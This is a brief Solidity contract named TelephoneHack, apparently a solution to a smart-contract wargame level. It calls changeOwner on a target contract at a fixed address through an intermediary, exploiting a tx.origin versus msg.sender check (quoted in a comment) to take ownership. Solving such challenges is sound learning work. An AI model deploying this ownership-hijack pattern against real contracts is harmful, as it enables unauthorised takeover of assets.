// SPDX-License-Identifier: MIT
pragma solidity >=0.4.0 <0.9.0;

interface Telephone{
  function changeOwner(address _owner) external;
}

contract TelephoneHack {

    Telephone public immutable orignalContract=Telephone(0xb6f654cB125Aa5FD67EfF297b5D89da7EA78FaFF);

 
  function newChangeOwner(address _newAddress) public{
    orignalContract.changeOwner(_newAddress);
  }

  // function changeOwner(address _owner) public {
  //   if (tx.origin != msg.sender) {
  //     owner = _owner;
  //   }
  // }
}